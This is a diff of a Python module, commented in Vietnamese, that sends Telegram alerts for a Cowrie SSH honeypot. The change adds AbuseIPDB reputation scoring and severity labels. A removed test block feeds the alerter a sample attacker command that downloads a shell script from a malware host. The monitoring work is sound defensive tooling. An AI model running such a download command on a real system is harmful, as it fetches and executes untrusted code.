@@ -4,109 +4,91 @@ from dotenv import load_dotenv
 
 load_dotenv()
 
-TOKEN   = os.getenv("TELEGRAM_TOKEN")
-CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
+TOKEN     = os.getenv("TELEGRAM_TOKEN")
+CHAT_ID   = os.getenv("TELEGRAM_CHAT_ID")
+ABUSE_KEY = os.getenv("ABUSEIPDB_KEY")
 
 def send_message(text: str) -> bool:
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     res = requests.post(url, json={
         "chat_id":    CHAT_ID,
         "text":       text,
-        "parse_mode": "HTML"
+        "parse_mode": "HTML",
+        "disable_web_page_preview": True
     })
     return res.status_code == 200
 
-def get_ip_info(ip: str) -> dict:
-    """Tra cứu vị trí + ISP từ IP dùng ipinfo.io (miễn phí)"""
-    # Bỏ qua IP nội bộ
+def check_abuseipdb(ip: str) -> int:
+    """Tra cứu điểm tín nhiệm IP trên AbuseIPDB (0-100)"""
     if ip.startswith(("127.", "192.168.", "10.", "172.")):
-        return {
-            "location": "Không xác định (IP nội bộ/không hợp lệ)",
-            "isp":      "N/A",
-            "lat":      None,
-            "lon":      None,
-        }
+        return 0
+    try:
+        url = 'https://api.abuseipdb.com/api/v2/check'
+        headers = {'Accept': 'application/json', 'Key': ABUSE_KEY}
+        params = {'ipAddress': ip, 'maxAgeInDays': '90'}
+        res = requests.get(url, headers=headers, params=params, timeout=5).json()
+        return res['data']['abuseConfidenceScore']
+    except:
+        return 0
+
+def get_severity(eventid, abuse_score=0):
+    """Phân loại mức độ cảnh báo 🔴🟠🟡🔵"""
+    if eventid == "cowrie.login.success":
+        return "🔴 <b>CRITICAL: SUCCESSFUL LOGIN</b>", "High"
+    if eventid == "cowrie.command.input":
+        return "🟠 <b>WARNING: COMMAND EXECUTED</b>", "Medium"
+    if abuse_score > 50:
+        return "🟡 <b>SUSPICIOUS: HIGH ABUSE SCORE</b>", "Warning"
+    return "🔵 <b>INFO: LOGIN ATTEMPT</b>", "Low"
+
+def get_ip_info(ip: str) -> dict:
+    abuse_score = check_abuseipdb(ip)
     try:
         res = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
         data = res.json()
-        loc  = data.get("loc", "")  # dạng "16.0678,108.2208"
+        loc  = data.get("loc", "")
         lat, lon = loc.split(",") if "," in loc else (None, None)
-        city    = data.get("city", "")
-        region  = data.get("region", "")
-        country = data.get("country", "")
         return {
-            "location": f"{city}, {region}, {country}".strip(", "),
-            "isp":      data.get("org", "Unknown"),
-            "lat":      lat,
-            "lon":      lon,
+            "location": f"{data.get('city', 'Unknown')}, {data.get('country', '??')}",
+            "isp": data.get("org", "Unknown"),
+            "lat": lat, "lon": lon, "abuse_score": abuse_score
         }
-    except Exception:
-        return {
-            "location": "Không xác định",
-            "isp":      "Unknown",
-            "lat":      None,
-            "lon":      None,
-        }
-
-def make_map_link(lat, lon) -> str:
-    if lat and lon:
-        return f'<a href="https://maps.google.com/?q={lat},{lon}">🗺️ Xem trên bản đồ</a>'
-    return ""
+    except:
+        return {"location": "Unknown", "isp": "Unknown", "lat": None, "lon": None, "abuse_score": abuse_score}
 
 def alert_login_failed(ip: str, username: str, password: str, count: int):
-    info     = get_ip_info(ip)
-    map_link = make_map_link(info["lat"], info["lon"])
+    info = get_ip_info(ip)
+    label, _ = get_severity("cowrie.login.failed", info['abuse_score'])
     msg = (
-        f"⚠️ <b>BRUTE-FORCE DETECTED</b>\n"
-        f"━━━━━━━━━━━━━━━\n"
-        f"🌐 IP: <code>{ip}</code>\n"
+        f"{label}\n━━━━━━━━━━━━━━━\n"
+        f"🌐 IP: <code>{ip}</code> (Score: {info['abuse_score']})\n"
         f"📍 Vị trí: <b>{info['location']}</b>\n"
         f"🏢 ISP: <i>{info['isp']}</i>\n"
-        f"{map_link}\n"
-        f"👤 Username: <code>{username}</code>\n"
-        f"🔑 Password thử: <code>{password}</code>\n"
-        f"🔢 Số lần thử: <b>{count}</b>\n"
+        f"👤 User: <code>{username}</code>\n"
+        f"🔑 Pass: <code>{password}</code>\n"
+        f"🔢 Số lần thử: <b>{count}</b>"
     )
     return send_message(msg)
 
 def alert_login_success(ip: str, username: str, password: str):
-    info     = get_ip_info(ip)
-    map_link = make_map_link(info["lat"], info["lon"])
+    info = get_ip_info(ip)
+    label, _ = get_severity("cowrie.login.success")
     msg = (
-        f"🚨 <b>NGUY HIỂM - ĐĂNG NHẬP THÀNH CÔNG</b>\n"
-        f"━━━━━━━━━━━━━━━\n"
+        f"{label}\n━━━━━━━━━━━━━━━\n"
         f"🌐 IP: <code>{ip}</code>\n"
         f"📍 Vị trí: <b>{info['location']}</b>\n"
-        f"🏢 ISP: <i>{info['isp']}</i>\n"
-        f"{map_link}\n"
-        f"👤 Username: <code>{username}</code>\n"
-        f"🔑 Password: <code>{password}</code>\n"
-        f"❗ Kẻ tấn công đã vào được hệ thống!"
+        f"👤 User: <code>{username}</code> | Pass: <code>{password}</code>\n"
+        f"❗ <b>Kẻ tấn công đã vào được hệ thống!</b>"
     )
     return send_message(msg)
 
 def alert_command(ip: str, command: str):
-    info     = get_ip_info(ip)
-    map_link = make_map_link(info["lat"], info["lon"])
+    info = get_ip_info(ip)
+    label, _ = get_severity("cowrie.command.input")
     msg = (
-        f"💻 <b>LỆNH NGUY HIỂM PHÁT HIỆN</b>\n"
-        f"━━━━━━━━━━━━━━━\n"
+        f"{label}\n━━━━━━━━━━━━━━━\n"
         f"🌐 IP: <code>{ip}</code>\n"
         f"📍 Vị trí: <b>{info['location']}</b>\n"
-        f"🏢 ISP: <i>{info['isp']}</i>\n"
-        f"{map_link}\n"
         f"⌨️ Lệnh: <code>{command}</code>"
     )
     return send_message(msg)
-
-if __name__ == "__main__":
-    print("Đang test gửi tin nhắn...")
-
-    ok = alert_login_success("14.243.43.221", "admin", "password123")
-    print(f"Login success (IP thật VN): {'OK' if ok else 'FAILED'}")
-
-    ok = alert_login_failed("185.220.101.45", "root", "123456", 15)
-    print(f"Brute-force (IP Đức): {'OK' if ok else 'FAILED'}")
-
-    ok = alert_command("8.8.8.8", "wget http://malware.com/virus.sh")
-    print(f"Command (Google IP): {'OK' if ok else 'FAILED'}")
